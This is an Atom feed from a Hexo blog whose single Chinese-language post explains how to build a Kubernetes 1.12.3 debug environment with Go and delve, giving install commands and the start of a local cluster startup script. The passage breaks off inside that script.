<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Saar&#39;s Blog</title>
  
  <subtitle>不忘初心 方得始终</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.mydreamdll.xyz/"/>
  <updated>2020-03-02T10:25:02.000Z</updated>
  <id>http://www.mydreamdll.xyz/</id>
  
  <author>
    <name>Saar</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>kubernetes debug环境搭建</title>
    <link href="http://www.mydreamdll.xyz/2020/03/02/kubernetes_debug%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://www.mydreamdll.xyz/2020/03/02/kubernetes_debug%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2020-03-02T10:25:56.103Z</published>
    <updated>2020-03-02T10:25:02.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="kubernetes-debug环境搭建"><a href="#kubernetes-debug环境搭建" class="headerlink" title="kubernetes debug环境搭建"></a>kubernetes debug环境搭建</h3><p>k8s debug环境搭建</p><h4 id="环境安装："><a href="#环境安装：" class="headerlink" title="环境安装："></a>环境安装：</h4><p>go 1.12版本，1.13版本太高，k8s编译有点问题。</p><p>k8s 1.12.3版本</p><p>centos 7安装 k8s，进行调试，使用dlv进行调试</p><p>安装必须要的组件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install -y docker wget curl vim golang etcd openssl git</span><br><span class="line">systemctl enable docker &amp;&amp; systemctl start docker</span><br></pre></td></tr></table></figure><p>设置gopath路径，之后安装好必须要的库</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u -v github.com/cloudflare/cfssl/cmd/...</span><br></pre></td></tr></table></figure><p>安装delve调试工具</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get -u -v github.com/derekparker/delve/cmd/dlv</span><br></pre></td></tr></table></figure> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/kubernetes/kubernetes.git $GOPATH/src/k8s.io/kubernetes</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b v1<span class="number">.12</span><span class="number">.3</span></span><br></pre></td></tr></table></figure><p>运行脚本安装和运行</p> <figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp hack/local-up-cluster.sh hack/local-up-cluster.sh.bak</span><br><span class="line">touch hack/local-up-cluster.sh &amp;&amp; chmod +x hack/local-up-cluster.sh</span><br></pre></td></tr></table></figure><p>使用下面脚本安装和运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Copyright 2014 The Kubernetes Authors.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Licensed under the Apache License, Version 2.0 (the <span class="string">"License"</span>);</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> you may not use this file except <span class="keyword">in</span> compliance with the License.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You may obtain a copy of the License at</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">     http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Unless required by applicable law or agreed to <span class="keyword">in</span> writing, software</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> distributed under the License is distributed on an <span class="string">"AS IS"</span> BASIS,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> See the License <span class="keyword">for</span> the specific language governing permissions and</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> limitations under the License.</span></span><br><span class="line">set -x</span><br><span class="line">KUBE_ROOT=$(dirname "$&#123;BASH_SOURCE&#125;")/..</span><br><span class="line"><span class="meta">#</span><span class="bash"> This <span class="built_in">command</span> builds and runs a <span class="built_in">local</span> kubernetes cluster.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You may need to run this as root to allow kubelet to open docker<span class="string">'s socket,</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and to write the <span class="built_in">test</span> CA <span class="keyword">in</span> /var/run/kubernetes.</span></span><br><span class="line">DOCKER_OPTS=$&#123;DOCKER_OPTS:-""&#125;</span><br><span class="line">DOCKER=(docker $&#123;DOCKER_OPTS&#125;)</span><br><span class="line">DOCKERIZE_KUBELET=$&#123;DOCKERIZE_KUBELET:-""&#125;</span><br><span class="line">ALLOW_PRIVILEGED=$&#123;ALLOW_PRIVILEGED:-""&#125;</span><br><span class="line">DENY_SECURITY_CONTEXT_ADMISSION=$&#123;DENY_SECURITY_CONTEXT_ADMISSION:-""&#125;</span><br><span class="line">PSP_ADMISSION=$&#123;PSP_ADMISSION:-""&#125;</span><br><span class="line">NODE_ADMISSION=$&#123;NODE_ADMISSION:-""&#125;</span><br><span class="line">RUNTIME_CONFIG=$&#123;RUNTIME_CONFIG:-""&#125;</span><br><span class="line">KUBELET_AUTHORIZATION_WEBHOOK=$&#123;KUBELET_AUTHORIZATION_WEBHOOK:-""&#125;</span><br><span class="line">KUBELET_AUTHENTICATION_WEBHOOK=$&#123;KUBELET_AUTHENTICATION_WEBHOOK:-""&#125;</span><br><span class="line">POD_MANIFEST_PATH=$&#123;POD_MANIFEST_PATH:-"/var/run/kubernetes/static-pods"&#125;</span><br><span class="line">KUBELET_FLAGS=$&#123;KUBELET_FLAGS:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> many dev environments run with swap on, so we don<span class="string">'t fail in this env</span></span></span><br><span class="line">FAIL_SWAP_ON=$&#123;FAIL_SWAP_ON:-"false"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Name of the network plugin, eg: <span class="string">"kubenet"</span></span></span><br><span class="line">NET_PLUGIN=$&#123;NET_PLUGIN:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> Place the config files and binaries required by NET_PLUGIN <span class="keyword">in</span> these directory,</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> eg: <span class="string">"/etc/cni/net.d"</span> <span class="keyword">for</span> config files, and <span class="string">"/opt/cni/bin"</span> <span class="keyword">for</span> binaries.</span></span><br><span class="line">CNI_CONF_DIR=$&#123;CNI_CONF_DIR:-""&#125;</span><br><span class="line">CNI_BIN_DIR=$&#123;CNI_BIN_DIR:-""&#125;</span><br><span class="line">SERVICE_CLUSTER_IP_RANGE=$&#123;SERVICE_CLUSTER_IP_RANGE:-10.0.0.0/24&#125;</span><br><span class="line">FIRST_SERVICE_CLUSTER_IP=$&#123;FIRST_SERVICE_CLUSTER_IP:-10.0.0.1&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">if</span> enabled, must <span class="built_in">set</span> CGROUP_ROOT</span></span><br><span class="line">CGROUPS_PER_QOS=$&#123;CGROUPS_PER_QOS:-true&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> name of the cgroup driver, i.e. cgroupfs or systemd</span></span><br><span class="line">CGROUP_DRIVER=$&#123;CGROUP_DRIVER:-""&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> owner of client certs, default to current user <span class="keyword">if</span> not specified</span></span><br><span class="line">USER=$&#123;USER:-$(whoami)&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> enables testing eviction scenarios locally.</span></span><br><span class="line">EVICTION_HARD=$&#123;EVICTION_HARD:-"memory.available&lt;100Mi,nodefs.available&lt;10%,nodefs.inodesFree&lt;5%"&#125;</span><br><span class="line">EVICTION_SOFT=$&#123;EVICTION_SOFT:-""&#125;</span><br><span class="line">EVICTION_PRESSURE_TRANSITION_PERIOD=$&#123;EVICTION_PRESSURE_TRANSITION_PERIOD:-"1m"&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> This script uses docker0 (or whatever container bridge docker is currently using)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and we don<span class="string">'t know the IP of the DNS pod to pass in as --cluster-dns.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To <span class="built_in">set</span> this up by hand, <span class="built_in">set</span> this flag and change DNS_SERVER_IP.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note also that you need API_HOST (defined above) <span class="keyword">for</span> correct DNS.</span></span><br><span class="line">KUBE_PROXY_MODE=$&#123;KUBE_PROXY_MODE:-""&#125;</span><br><span class="line">ENABLE_CLUSTER_DNS=$&#123;KUBE_ENABLE_CLUSTER_DNS:-true&#125;</span><br><span class="line">DNS_SERVER_IP=$&#123;KUBE_DNS_SERVER_IP:-10.0.0.10&#125;</span><br><span class="line">DNS_DOMAIN=$&#123;KUBE_DNS_NAME:-"cluster.local"&#125;</span><br><span class="line">KUBECTL=$&#123;KUBECTL:-cluster/kubectl.sh&#125;</span><br><span 